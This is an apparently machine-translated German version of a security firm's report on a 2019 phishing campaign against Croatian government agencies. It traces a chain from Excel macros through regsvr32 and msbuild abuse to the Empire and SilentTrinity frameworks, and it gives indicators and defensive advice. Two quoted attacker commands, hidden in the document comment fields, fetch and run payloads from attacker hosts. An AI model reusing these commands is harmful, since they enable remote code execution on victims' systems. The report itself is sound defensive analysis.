<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👂🏾 🥪 🤪 IronPython auf der Seite des Bösen: Wie wir einen Cyberangriff auf öffentliche Dienste in einem europäischen Land aufgedeckt haben 🚰 👍🏾 💆🏻</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Unsere Experten vom Expertensicherheitszentrum sind immer auf dem Laufenden und überwachen das Auftreten neuer interessanter und gefährlicher Bedrohun...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>IronPython auf der Seite des Bösen: Wie wir einen Cyberangriff auf öffentliche Dienste in einem europäischen Land aufgedeckt haben</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/458766/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u="><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="Bild"></a> <br><br>  Unsere Experten vom Expertensicherheitszentrum sind immer auf dem Laufenden und überwachen das Auftreten neuer interessanter und gefährlicher Bedrohungen.  So wurde Anfang April 2019 ein gezielter Angriff auf die kroatische Regierung entdeckt.  In diesem Bericht wurde die Kette der Malware-Übermittlung an den Computer des Opfers untersucht, Kompromissindikatoren vorgestellt und die Verwendung eines neuen postoperativen Frameworks festgestellt, das nach unseren Daten von Angreifern nie verwendet wurde. <a name="habracut"></a><br><br><h2>  Opferinfektion </h2><br>  Am 2. April 2019 entdeckten Experten des PT Expert Security Center bei einer routinemäßigen Überwachung verschiedener Ressourcen auf neue Malware ein ungewöhnliches Bürodokument. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/719/16e/e61/71916ee61f47e529490f3da0ca0db121.png" alt="Bild"><br><br>  <i>Abbildung 1. Schädliches Dokument</i> <br><br>  Die Sendebenachrichtigung wurde in der MS Excel Office-Anwendung erstellt und einen Tag zuvor (2019-04-01 16:28:07 (UTC)) im alten XLS-Format gespeichert.  Der verfügbare Zeitstempel in der Presse (2018-07-25 00:12:30 (UTC)) zeigt jedoch an, dass das Dokument bereits 2018 verwendet wurde.  Wir werden auf dieses indirekte Symptom weiter unten zurückkommen. <br><br>  Es ist bemerkenswert, dass das Feld "Kommentare" (das geändert werden kann, einschließlich der Verwendung der MS Excel-Anwendung) einen Befehl in der Windows-Shell enthält: <br><br><pre><code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>): objShell.Run <span class="hljs-string"><span class="hljs-string">"net use https://postahr.vip"</span></span>, 0, False: Wscript.Sleep 10000: objShell.Run <span class="hljs-string"><span class="hljs-string">"regsvr32 /u /n /s /i:https://postahr.vip/page/1/update.sct scrobj.dll"</span></span>, 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><img src="https://habrastorage.org/getpro/habr/post_images/557/a53/082/557a53082352f47cc4c079305408a7cc.png" alt="Bild"><br><br>  <i>Abbildung 2. Das Feld "Kommentare" mit verdächtigen Inhalten</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/a93/f80/6e8/a93f806e8dca3dfb1a81ee0da457da95.png" alt="Bild"><br><br>  <i>Abbildung 3. Der Inhalt des Kommentarfelds in binärer Form</i> <br><br>  Als Ergebnis der Ausführung dieses Befehls erstellt das System ein Skript in der Sprache Visual Basic, das beim Start die folgenden Aktionen ausführt: <br><br><ul><li>  Verbinden einer Netzwerkressource mithilfe der WebDAV-Technologie </li><li>  Laden Sie die Datei der nächsten Infektionsstufe mit dem legitimen Systemdienstprogramm regsvr32 herunter und führen Sie sie aus. </li></ul><br>  Wenn eine Netzwerkressource über HTTP (S) verbunden ist, wird eine NTLM-Anforderung an den Angreifer-Server gesendet, mit deren Hilfe der NTLM-Hash wiederhergestellt werden kann.  Dann kann der empfangene Hash für die Autorisierung von Diensten im Namen des Opfers verwendet werden.  Wir haben keine Spuren solcher Angriffe gefunden, und die Gründe für die Verbindung einer Netzwerkressource bleiben unklar. <br><br>  Die Technik, regsvr32 (Verwalten von ActiveX-Steuerelementen) für böswillige Zwecke zu verwenden, ist nicht neu und hat sogar einen Namen - Squiblydoo.  Angreifer verwenden es, um die Anforderungen zur Steuerung des Starts vertrauenswürdiger Programme zu erfüllen und die Antivirenerkennung zu umgehen. <br><br>  Der Text im Feld "Kommentare" ist an sich harmlos und seine Ausführung muss irgendwie konditioniert sein.  Wenn das Opfer das empfangene Excel-Dokument öffnet, wird eine Trap-Meldung in kroatischer Sprache angezeigt, in der Sie aufgefordert werden, Makros einzuschließen: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/97d/8a4/b5a/97d8a4b5a0406ebef6d02ea3c8b1b994.png" alt="Bild"><br><br>  <i>Abbildung 4. Trap-Nachricht nach dem Öffnen eines Dokuments</i> <br><br>  Wenn Makros zulässig sind, wird dem Benutzer eine gefälschte Paketbenachrichtigung mit dem kroatischen Postlogo angezeigt: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d64/2d3/1e2/d642d31e23e0d4fa7ca34dc652ad522b.png" alt="Bild"><br><br>  <i>Abbildung 5. Falsche Paketbenachrichtigung</i> <br><br>  In der Zwischenzeit wird mithilfe der Makrotools das Skript für das Feld "Kommentare" ausgeführt und das im System erstellte Skript zum Start hinzugefügt: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/678/7ab/4aa/6787ab4aab57ef3ad22b190c2474f8c5.png" alt="Bild"><br><br>  <i>Abbildung 6. Schlüsselmakrologik</i> <br><br>  Seltsamerweise wird das erstellte Skript nicht von einem Makro ausgelöst.  Möglicherweise ist dies die Absicht des Angreifers: Die nächste Infektionsstufe tritt nach einem Neustart des Systems und der Benutzeranmeldung auf.  Wir werden auf dieses Detail weiter unten zurückkommen. <br><br>  Ein Teil des Szenarios ist auf seine eigene Weise interessant: Eine übersichtliche Codestruktur mit Formatierung, Einrückung und anderen Nuancen von Markups kann ein Zeichen für die Verwendung von Code von Drittanbietern und sogar für ein Programm sein, mit dem Sie solche Dokumente automatisch erstellen können. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ba4/e7c/2cc/ba4e7c2ccb1eeb9bb4a2de8dbf8dda13.png" alt="Bild"><br><br>  <i>Abbildung 7. Vermutlich geliehener Teil des Makros</i> <br><br>  Die Schlüsselwortsuche bietet viele ähnliche Codeteile auf verschiedenen Ressourcen.  Wir neigen dazu zu glauben, dass der Hacker einfach den entsprechenden Programmcode gefunden und ein wenig optimiert hat, um die von ihm benötigten Aktionen auszuführen: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/899/608/9fc/8996089fca65afdf132c69c6d943a6fa.png" alt="Bild"><br><br>  <i>Abbildung 8. Beispiel eines ähnlichen Makros auf issuu.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fa5/c22/3f6/fa5c223f681efa6950cb71067f26c877.png" alt="Bild"><br><br>  <i>Abbildung 9. Ein Beispiel für ein ähnliches Makro auf stackoverflow.com</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/1dd/bdb/f59/1ddbdbf592989692bc8d15712f638f37.png" alt="Bild"><br><br>  <i>Abbildung 10. Beispiel eines ähnlichen Makros auf dummies.com</i> <br><br>  Kehren wir mit dem Dienstprogramm regsvr32 zur nächsten Infektionsstufe zurück.  Wenn der Befehl ausgeführt wird, wird das Skriptlet update.sct in JavaScript vom Server des Angreifers heruntergeladen.  Der Hauptteil des Skripts enthält Binärdaten, die vom Base64-Algorithmus codiert werden.  Nach dem Dekodieren werden die empfangenen Daten deserialisiert und mithilfe der .NET Framework-Softwareplattform ausgeführt. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/0e0/d7d/9f8/0e0d7d9f8b6324b3aadce5a203d28075.png" alt="Bild"><br><br>  <i>Abbildung 11. Das vom Server des Angreifers heruntergeladene Skript update.sct</i> <br><br>  Es ist erwähnenswert, dass dieser Code auch vom Angreifer auf einer der öffentlichen Ressourcen ausgeliehen wurde: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b26/b9c/673/b26b9c673c0aace886123fc47b3d70c4.png" alt="Bild"><br><br>  <i>Abbildung 12. Ein Beispiel für einen ähnlichen Code in rastamouse.me</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/25e/5ec/aef/25e5ecaeff7cebf201d5781fb8423ddc.png" alt="Bild"><br><br>  <i>Abbildung 13. Ein Beispiel für einen ähnlichen Code auf github.com</i> <br><br>  Es scheint nicht, dass der Hacker die Logik der verwendeten Tools sorgfältig untersucht hat.  Im betrachteten Scriptlet wird beispielsweise die Setversion-Funktion aufgerufen, die nichts bewirkt.  Ein Beispiel, das im Internet verfügbar ist, sieht ebenfalls so aus. <br><br>  Das entpackte und gestartete Objekt ist eine ausführbare PE-Datei auf der .NET-Plattform. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/20f/274/650/20f274650305046ab50359cd089a517d.png" alt="Bild"><br><br>  <i>Abbildung 14. Der Header der ausführbaren PE-Datei</i> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/cf6/946/d54/cf6946d543b6b8a02f79bc06b3470d7e.png" alt="Bild"><br><br>  <i>Abbildung 15. Debug-Informationen der SharpPick PE-Datei</i> <br><br>  Als Ergebnis der Kompilierung wurde der Pfad zum Projekt mit dem Quellcode beibehalten.  Das Suffix -master gibt an, dass das Projekt zuvor aus dem Repository geklont wurde, und das SharpPick-Verzeichnis führt zu einer bekannten Anwendung, mit der Sie PowerShell-Code herunterladen und ausführen können, ohne den Sprachinterpreter direkt zu verwenden, aber .NET-Abhängigkeiten zu verwenden. <br>  Trotz der Verfügbarkeit des SharpPick-Hilfsprojekts auf GitHub sollten Sie sicherstellen, dass keine wesentlichen Änderungen vorgenommen wurden. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/300/f5f/689/300f5f689737fae0872ddaaaec6d5fbc.png" alt="Bild"><br><br>  <i>Abbildung 16. Teil des dekompilierten SharpPick-Dienstprogrammcodes</i> <br><br>  Als Ergebnis der Dekompilierung wurde ein Pseudocode erhalten, bei dem er aus Base64 dekodiert und das PowerShell-Skript gestartet wird: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/fd7/9c0/dae/fd79c0dae768b4bc3e6bd8916b871c4a.png" alt="Bild"><br><br>  <i>Abbildung 17. Teilweise konvertiertes PowerShell-Skript</i> <br><br>  Nach der Vereinfachung des Codes ist es nicht schwierig, seine Logik zu analysieren: <br><br><ul><li>  Es wird ein Objekt für die Interaktion mit dem Webserver mit den angegebenen User-Agent-, Cookie- und Proxy-Einstellungen erstellt. </li><li>  Die Nutzdaten werden an der angegebenen Adresse geladen. </li><li>  Das Ergebnis wird vom RC4-Algorithmus mit dem angegebenen Schlüssel entschlüsselt und gestartet. </li></ul><br>  Leider war der Verwaltungsserver während unserer Recherche bereits nicht verfügbar.  Die Daten, die früher von ihm erhalten wurden, konnten wir nicht finden.  Diesmal gibt es jedoch genügend Informationen im Web (Beispiel: Bericht unserer Kollegen von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=https://www.google.com/url%3Fq%3D">FireEye</a> ), um eindeutig festzustellen: Das Endglied in dieser Infektionskette ist Empire Backdoor, ein Tool für die Remoteverwaltung des Computers des Opfers als Teil des postoperativen Frameworks von Empire Framework. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b7e/a88/eab/b7ea88eab8ddfb21880d2f2a8b04f51d.png" alt="Bild"><br><br>  <i>Abbildung 18. Verwenden eines ähnlichen PowerShell-Skripts zum Angreifen von Sicherheitslücken in WinRAR</i> <br><br>  Interessanterweise führen andere Skriptmuster zu einem ausführlichen Artikel über Penetrationstesttechniken mit besonderem Augenmerk darauf, die Infrastruktur von Angreifern hinter Proxyservern zu verbergen.  Die wahrscheinlichste Informationsquelle, die der Angreifer verwendet, ist ein Artikel von Kollegen von Payatu Technologies, in dem sie detaillierte Anweisungen zum Umleiten von Sitzungen zu legitimen Ressourcen, zum Blockieren unerwünschter Pakete, zum Protokollieren usw. einschließlich der Verwendung von Empire enthalten. <br><br>  Einige Stunden später fanden wir ein weiteres Dokument auf dem Paket.  Es hat viele Ähnlichkeiten mit dem vorherigen: auch in Kroatien gefunden (2019-04-02 16:52:56 (UTC)), hat den gleichen Namen und sogar ein Fallenbild über das empfangene Paket.  Trotzdem gibt es Unterschiede. <br><br>  Der Schadcode befindet sich wieder im Feld "Kommentare", diesmal wurde jedoch die Logik der Aktionen geändert. <br><br><pre> <code class="bash hljs">cmd.exe /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> Set objShell = CreateObject(<span class="hljs-string"><span class="hljs-string">"Wscript.Shell"</span></span>):objShell.Run <span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe /c net use \\176.105.255.59\webdav"</span></span>,0:Wscript.Sleep 60000: objShell.Run <span class="hljs-string"><span class="hljs-string">"%windir%\Microsoft.Net\Framework\v4.0.30319\msbuild.exe \\176.105.255.59\webdav\msbuild.xml"</span></span> , 0, False: Set objShell = Nothing &gt; C:\users\%username%\appdata\<span class="hljs-built_in"><span class="hljs-built_in">local</span></span>\microsoft\silent.vbs</code> </pre> <br><ul><li>  Die Netzwerkressource wird über das SMB-Protokoll verbunden. </li><li>  Laden Sie die nächste Infektionsstufe herunter und starten Sie sie mit msbuild, einem legitimen Dienstprogramm des .NET Framework-Pakets. </li></ul><br>  Es ist interessant, dass die webdav-Zeile in der Adresse des bereitgestellten Verzeichnisses vorhanden ist und diesen Fall indirekt mit dem vorherigen verknüpft.  Diesmal ist ein Angriff auf den NTLM-Hash weiterhin möglich, obwohl es keine Hinweise auf seine Verwendung gibt.  Auch hier wird eine legitime Anwendung (diesmal msbuild) verwendet, um die Einschränkung beim Starten von Programmen von Drittanbietern erfolgreich zu umgehen.  Bevor wir die Missbrauchstechnik beschreiben, erwähnen wir die Unterschiede im Programmcode des Makros eines neuen Dokuments. <br><br>  Angreifer haben keine wesentlichen Änderungen an der Logik des VBA-Skripts vorgenommen.  Es ist jedoch anzumerken, dass diesmal nicht nur das erstellte VBS-Skript automatisch in das System geladen, sondern auch beim Öffnen des Dokuments gestartet wird.  Höchstwahrscheinlich haben die Angreifer im vorherigen Fall dies einfach vergessen und nach einiger Zeit, nachdem sie einen Fehler entdeckt hatten, diesen in der neuen Version des Dokuments korrigiert. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/77d/670/2b3/77d6702b3bc07650a4f462b62cf975fd.png" alt="Bild"><br><br>  <i>Abbildung 19. Vergleich des Makrocodes in zwei Dokumenten</i> <br><br>  Die nächste Infektionsstufe ist ein XML-Dokument, das C # -Code enthält.  Mit einer Funktion des Dienstprogramms msbuild können Sie den enthaltenen Code im laufenden Betrieb kompilieren und ausführen, wie aus den Kommentaren hervorgeht, die der Hacker zu Beginn des Markups hinterlassen hat. <br><br>  Der Base64-Puffer wird erneut im Code dargestellt, der dekodiert, vom Deflate-Algorithmus dekomprimiert und gestartet wird.  Wir glauben, dass der Leser bereits erkennt, dass der Angreifer diesmal auch eine frei zugängliche Vorlage verwendet hat, wie aus den genannten Kommentaren und vielen Quellen im Web mit demselben Code hervorgeht. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d68/6ea/4ac/d686ea4acff8cb52067c0c53cb6bf749.png" alt="Bild"><br><br>  <i>Abbildung 20. Die vom Angreifer-Server heruntergeladene Aufgabe msbuild.xml</i> <br><br>  Infolgedessen wird diesmal eine PE-Datei auf der .NET-Plattform geladen und im Speicher ausgeführt.  Die Debugging-Informationen enthalten nicht nur ein Zeichen dafür, dass das Projekt auf einer virtuellen Maschine erfasst wurde (möglicherweise, um Informationen über den Angreifer zu verbergen), sondern auch das SILENTTRINITY-Verzeichnis, auf das wir näher eingehen werden. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/adf/3fe/653/adf3fe65355eb2c7418a5438afc5aa34.png" alt="Bild"><br><br>  <i>Abbildung 21. Debug-Informationen der SILENTTRINITY PE-Datei</i> <br><br>  Nachdem wir diese beiden Paketdokumente studiert hatten, fanden wir zwei weitere.  Sowohl das Dateiformat als auch der Name und das Trap-Bild mit dem angegebenen Bereich blieben unverändert.  Ende August 2018 lagen Dokumente vor, die die Hypothese über die Langfristigkeit der Kampagne bestätigen, über die wir zu Beginn des Berichts geschrieben haben. <br><br>  Es ist merkwürdig, dass Hacker im letzten Jahr das Feld "Kommentare" nicht verwendet haben, aber legitime Dienstprogramme gestartet haben.  Die schädliche Komponente wurde mithilfe des Dienstprogramms zum Arbeiten mit Zertifikaten und kryptografischen Zertifikatsvorgängen geladen, und der Start wurde von den WMI-Systemverwaltungstools bereitgestellt: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/95b/f2f/5a9/95bf2f5a9dc3693dd275bc9153e2a364.png" alt="Bild"><br><br>  <i>Abbildung 22. Vergleich der Dokumentmakros für 2018</i> <br><br>  Leider konnten wir nach der Einschränkung des Geschehens die nachfolgenden Glieder in der Angriffskette von 2018 nicht herstellen. <br><br>  Es ist auch erwähnenswert, dass ein Teil des VBA-Skriptcodes unverändert blieb, mit Ausnahme der gelöschten Hilfskommentare, die die Logik der Arbeit erläutern. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ef4/16b/9ee/ef416b9ee48a47b9795cf24db66b7555.png" alt="Bild"><br><br>  <i>Abbildung 23. Vergleich der Makros 2019 und 2018</i> <br><br><h2>  SilentTrinity Framework </h2><br>  Suchergebnisse für das Schlüsselwort SILENTTRINITY aus den Debug-Informationen der PE-Datei können den Ursprung dieses Angriffslinks leicht bestimmen.  Im Oktober 2018 veröffentlichte Marcello Salvati (ein Forscher bei Black Hills Information Security) ein Projekt namens SILENTTRINITY im beliebten GitHub-Repository.  Die Hauptidee: die Flexibilität und die Vorteile des bekannten postoperativen PowerShell-Frameworks in der Python-Programmiersprache Python, nämlich IronPython, nutzen.  Das Projekt entwickelt sich bis heute. <br><br>  Wir werden uns nicht mit den Details der Arbeit und Umsetzung des Projekts befassen (zumal der Autor in seinem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=https://www.google.com/url%3Fq%3D">Bericht</a> ausführlich darüber gesprochen hat).  Wir werden nur die grundlegende Logik der Arbeit und interessante Punkte in der Implementierung hervorheben. <br><br>  Nach dem Starten der PE-Datei (der Zwischenlink kann jedoch ein anderes Format haben) tritt Folgendes auf: <br><br><ul><li>  Zugriff auf den Verwaltungsserver zum Herunterladen des ZIP-Archivs mit den erforderlichen Abhängigkeiten und dem Python-Hauptskript; </li><li>  Archivinhalte werden extrahiert, ohne auf der Festplatte gespeichert zu werden. </li><li>  Abhängigkeiten werden für die erfolgreiche Verarbeitung von Python-Skripten registriert. </li><li>  Das Python-Hauptskript wird gestartet und wartet auf die Aufgabe des Angreifers. </li><li>  Jede Aufgabe wird als vorgefertigtes Python-Skript übertragen. </li><li>  Die Aufgabe wird auf der Opferseite in einem separaten Thread ausgeführt. </li><li>  Das Ergebnis der Arbeit wird zurück auf den Verwaltungsserver übertragen. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/ed9/250/ca2/ed9250ca2557c5f70ff18d60c33f1b31.png" alt="Bild"><br><br>  <i>Abbildung 24. Betriebsdiagramm des SilentTrinity-Frameworks</i> <br><br>  Von den Funktionen ist Folgendes hervorzuheben: <br><br><ul><li>  Unterstützung für IronPython, einschließlich der Boo-Sprache (eine Teilmenge von IronPython mit starker Datentypisierung). </li><li>  Für alle Aktivitäten ist kein Speicherplatz erforderlich: Abhängigkeiten, Skripts und Aufgaben befinden sich im Speicher (dateiloser Angriff). </li><li>  Archiv mit Abhängigkeiten, Aufgaben, dem Ergebnis der Arbeit der Teams - die gesamte Kommunikation zwischen dem Opfer und dem Hacker wird mit dem AES-Algorithmus verschlüsselt. </li><li>  Der gemeinsam genutzte Schlüssel wird vom Diffie-Hellman-Protokoll generiert. </li><li>  Der Netzwerktransport wird auf der Ebene des HTTP (S) -Protokolls mit Proxy-Unterstützung bereitgestellt. </li></ul><br><img src="https://habrastorage.org/getpro/habr/post_images/558/531/383/5585313839721f1220fe25cf6093e16a.png" alt="Bild"><br><br>  <i>Abbildung 25. Beispiel für eine Benutzeroberfläche auf der Serverseite des SilentTrinity-Frameworks</i> <br><br>  Interessanterweise wurde der PE-Loader am Tag der Angriffe in den VirusTotal-Dienst hochgeladen, wo kein Antiviren-Anbieter ihn als bösartig identifizierte.  Dies ist nicht überraschend: Erstens gelangt die Binärdatei nicht auf die Festplatte, und die Signaturerkennung ist wenig sinnvoll.  Zweitens ist die statische Erkennung bei weitem nicht die einzige Technologie zum Schutz der Benutzer. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d24/126/15c/d2412615ccb6eadccf22c7bec91aa7ec.png" alt="Bild"><br><br>  <i>Abbildung 26. Ergebnis des SilentTrinity-Bootloader-Scans am Angriffstag</i> <br><br>  Darüber hinaus tauchten wenige Tage nach dem Angriff immer noch Entdeckungsurteile auf.  Es ist wichtig, dass während der Angriffszeit entweder die Schutzausrüstung noch nicht mit Erkennungsalgorithmen ausgestattet war oder die Bedrohung im Prinzip nicht bekannt war. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e6e/3f2/9d9/e6e3f29d93ff8aa9053c3e7dc4ac30ce.png" alt="Bild"><br><br>  <i>Abbildung 27. Das aktuelle Scan-Ergebnis des SilentTrinity-Bootloaders</i> <br><br>  Dies war höchstwahrscheinlich der Grund für die Wahl dieser Lösung für die Durchführung von Angriffen.  Wir haben keine Informationen darüber, dass das SilentTrinity-Framework bereits zuvor bei böswilligen Angriffen verwendet wurde. <br><br>  Von Angreifern genutzte Infrastruktur <br><br>  Es ist erwähnenswert, dass die von Hackern verwendete Netzwerkinfrastruktur chronologisch mit laufenden Angriffen zusammenhängt. <br><br><img src="https://habrastorage.org/webt/9u/uq/ug/9uuqugtgx2tbnobx9tjhadnbldk.png"><br><br>  <i>Tabelle 1. Informationen zu den Domänen, die als angreifende Server verwendet werden</i> <i><br></i> <br><br>  Domänen wurden so erstellt, dass sie legitimen angegriffenen Ressourcen ähneln.  Dadurch können Benutzer Vertrauen in Phishing-Angriffe gewinnen.  Beachten Sie, dass die beteiligten Ressourcen nicht auf Kroatien beschränkt sind. <br><br>  Alle Domains werden mithilfe der WhoisGuard-Sicherheitstechnologie registriert.  Sie können die tatsächlichen Informationen über den Domain-Registranten ausblenden, um sich vor Spam zu schützen, während Angreifer diese Technologie zur Anonymisierung verwenden. <br><br>  Server, die Malware vertreiben und verwalten, wurden vom niederländischen Anbieter Breezle geleast. <br><br>  Alle verfügbaren Informationen zu den Knoten, Adressen und Domänen der Angreifer mit vielen Verbindungen untereinander ermöglichen es uns, die große Menge an Malware zu beurteilen, die die Angreifer diesmal hatten.  Wir schließen nicht aus, dass in der Kampagne ähnliche Tools wie die in Betracht gezogenen verwendet werden könnten und einige Infektionsfälle ungelöst blieben. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/88d/308/4a4/88d3084a4fdcc666d13cb22d0f7ca88a.png" alt="Bild"><br><br>  <i>Abbildung 28. Grafische Darstellung der Infrastruktur eines Angreifers</i> <br><br><h2>  Fazit </h2><br>  Einen Tag nach der Entdeckung der Dokumente in den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=https://www.google.com/url%3Fq%3D">Nachrichten</a> wurde eine Pressemitteilung mit einem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=https://www.google.com/url%3Fq%3D">Link</a> zum kroatischen Ministerium für Sicherheit von Informationssystemen über gezielte Phishing-Angriffe veröffentlicht.  Spuren wurden in mehreren Regierungsstellen des Landes gefunden.  Es wird berichtet, dass E-Mails an die Opfer mit einem Link zu einer Phishing-Site gesendet wurden, von der vorgeschlagen wurde, ein schädliches Dokument herunterzuladen, von dem aus unsere Analyse begann.  Dies füllt die fehlenden Glieder in der Angriffskette und am Ende möchten wir auf Schutzmethoden achten, die den Schaden durch solche Angriffe verringern können: <br><br><ul><li>  Überwachung und Kontrolle der Verwendung einiger vertrauenswürdiger Programme (certutil, regsvr32, msbuild, net, wmic ...) </li><li>  Überprüfen und analysieren Sie nicht nur Anhänge in E-Mails, sondern auch Weblinks </li><li>  Regelmäßige Scans des PC-Speichers in einem Unternehmensnetzwerk </li><li>  Erfolgreiche Verbindungen zur C2 Silent Trinity (auch unter TLS) können mithilfe von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PT Network Attack Discovery</a> erkannt werden. <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Darüber</a> hinaus haben <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">wir</a> in <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">unserem Repository</a> Erkennungen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">für die Community veröffentlicht.</a> </li></ul><br>  Gepostet <b>von</b> Alexey Vishnyakov, Positive Technologies <br><br>  PS Zu diesem Thema las der Autor auch einen Bericht an den Positive Hack Days 9. Das Video dieser und anderer Präsentationen ist verfügbar unter: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">www.phdays.com/en/broadcast/</a> . <br><br><div class="spoiler">  <b class="spoiler_title">Kompromissindikatoren:</b> <div class="spoiler_text">  0adb7204ce6bde667c5abd31e4dea164 <br>  13db33c83ee680e0a3b454228462e73f <br>  78184cd55d192cdf6272527c62d2ff89 <br>  79e72899af1e50c18189340e4a1e46e0 <br>  831b08d0c650c8ae9ab8b4a10a199192 <br>  92530d1b546ddf2f0966bbe10771521f <br>  c84b7c871bfcd346b3246364140cd60f <br>  hxxps: //postahr.vip/page/1/update.sct <br>  hxxps: //posteitaliane.live/owa/mail/archive.srf <br>  hxxps: //konzum.win/bat3.txt <br>  hxxp: //198.46.182.158/bat3.txt <br>  hxxps: //176.105.255.59: 8089 <br>  [\\] 176.105.255.59 \ webdav \ msbuild.xml <br>  postahr.online <br>  176.105.254.52 <br>  93.170.105.32 </div></div></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de458766/">https://habr.com/ru/post/de458766/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de458754/index.html">GPS für Mistkäfer: multimodales Orientierungssystem</a></li>
<li><a href="../de458756/index.html">Wie wir gelernt haben, mit GoPractice Simulator datengesteuert zu sein</a></li>
<li><a href="../de458758/index.html">Die Pracht und Armut der übersetzten Literatur</a></li>
<li><a href="../de458760/index.html">Die Ausstellung in Las Vegas richtet sich an Elektronikentwickler und nicht an Verbraucher. Ein Bericht von der Design Automation Conference</a></li>
<li><a href="../de458764/index.html">Grundlegende agile Praktiken für technische und nichttechnische Teams im Jahr 2019</a></li>
<li><a href="../de458768/index.html">5-6 Gründe, zu GolangConf zu kommen</a></li>
<li><a href="../de458770/index.html">Die ganze Wahrheit über RTOS. Artikel 29. Unterbrechungen in Nucleus SE</a></li>
<li><a href="../de458774/index.html">Funktionales DBMS</a></li>
